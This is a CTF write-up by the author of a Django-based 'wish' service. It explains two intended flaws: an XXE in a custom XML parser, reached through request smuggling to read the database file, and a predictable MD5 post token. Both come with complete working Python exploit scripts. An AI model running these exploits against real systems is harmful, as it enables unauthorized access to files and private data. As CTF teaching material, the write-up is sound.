# Django Bells Writeup

## 1. Service Description

### 1.1 First look (Webpage):

It's a pretty easy service to explore because it does not have a lot of functionality. When we first vist `http://<ip>:8000` we see a wish submit page. Other than that we can also find a `/list` endpoint and an endpoint after submitting a wish that looks like `/read/<post_id>/<post_token>` where `post_token` is a secret string for each post.

### 1.2 Second look (Source Code):

If we take a look at the source code we see that the service has an api "backend" and a "frontend" that interacts with that api. In the code we see that there is also a `/report` endpoint.

## 2. Service Functionality

If we look at how the service works in-depth then we see that when we create a post the browser sends a request to `/create?post_data=<data>` and then sends that `data` to the api backend. After that, the user is redirected to their wish at `/read/<post_id>/<post_token>`. After the post is made the server also send a report to the api backend telling it that it created a post. We can also list posts which basically just asks the database for the posts, gets their id, timestamp and lists them to the user and replaces the wish with `****`.

## 3. Exploits

### First Exploit

If we look at how the report works we see that it uses `xml` and `base64` to make sure that the data in the right format. If we take a look into how the `xml` works we see that it is a custom parser that seems buggy as hell. Reading through it one can find this:
```py
try:
    with open(path, "rb") as f:
        file_s = repr(f.read())    
except Exception as e:
    pass
self.xe["&" + name + ";"] = file_s
```
but there are two problems: Firstly because the XML object is initalized as `secure=true`, meaning whenever we try to add any new entities to the xml structure we raise a XMLException:
```py
def replace(self, value, key):
        if self.secure and len(self.xe) > 5:
            raise XMLException
        return value.replace(key, self.xe[key])
```
Secondly, we don't have control over the XML string on the frontend and we can not directly access the `api` backend.
The key to the first problem is that we see that the service just checks the length meaning if we don't create any new entities we can still use them. So let's just overwrite one of the default entities like `&amp` and use that. Thats the first part. But there is still the problem with not having access to the api endpoint. We can bypass this by looking at how the frontend connects to the backend (settings.py): 
```py
def make_api_call(request,endpoint):
    api = get_api_host(request)
    url = "http://" + api + "/api/" + endpoint
    r = requests.get(unquote(url))
    return r.text
```
We see that the service uses the requests module. So how about we use the `/read` endpoint and try to smuggle another valid request through the `read` to `report`. This is exactly how it works. Now combining all this and reading the `db.sqlite3` file, so we have access to all flags, we get this:
```py
import base64
import urllib.parse
import urllib.request
import sys

exploit_xml = """
<?xml version="1.0" ?>
<!DOCTYPE xxe [
<!ENTITY gt SYSTEM "file://db.sqlite3">
]>
<report>
<id>&gt;</id>
<reason>Sample Reason</reason>
</report>
"""

PORT = 8000


def exploit(target):
    exploit_xml_b64 = base64.b64encode(exploit_xml.encode('utf-8'))
    exploit_xml_b64_url = urllib.parse.quote(exploit_xml_b64.decode('utf-8'), safe='')
    exploit_xml_finished = f"report/?report={exploit_xml_b64_url}#"
    exploit_xml_to_send_pre = urllib.parse.quote(exploit_xml_finished, safe='')
    exploit_xml_to_send = urllib.parse.quote(exploit_xml_to_send_pre, safe='')

    db_output = urllib.request.urlopen(f"http://{target}:{PORT}/read/{exploit_xml_to_send}/loremipsum").read()
    print(db_output)


if __name__ == '__main__':
    exploit(sys.argv[1] if len(sys.argv) > 1 else 'localhost')
```

### Second Exploit

The second exploit can be pretty tricky to spot but other than that pretty easy. If we take a look into how the server creates the secret tokens for wishes / posts we see that it uses the `token.py` file in the `/util` folder. If we look at how the code is called then we see that the order in the object creation is the wrong way around:
```py
def __init__(self, nonce, time_stamp):
        self.nonce = nonce
        self.time_stamp = time_stamp
```
```py
tok = Token(stamp, nonce).create_token()
```
This means we can use the `/list` endpoint to retrieve the id and time stamp of a post and then use the `token.py` library to reverse the secret token of the posts. After that we can just use the `/read` endpoint to read the post and get the flag. The exploit will look like this then:
```py
import urllib.parse
import urllib.request
import sys
import re
import hashlib

PORT = 8000


def exploit(target):
    url = f"http://{target}:{PORT}"

    listed_posts = urllib.request.urlopen(f"{url}/list").read().decode('utf-8')
    # example for just the latest post
    id = re.findall(r"ID:.+?> (.+?)<", listed_posts)[0]
    timestamp = re.findall(r"Timestamp: .+?(\d+)", listed_posts)[0]
    token = hashlib.md5(str(timestamp).encode("utf-8")).hexdigest()
    post = urllib.request.urlopen(f"{url}/read/{id}/{token}").read()
    print(post)


if __name__ == '__main__':
    exploit(sys.argv[1] if len(sys.argv) > 1 else 'localhost')
```
Both exploits written by `NukeOffical`

## Closing Words:

This was my first CTF service so I hope you all had fun exploiting it. I would love to see some writeups of other people. So that's it. 


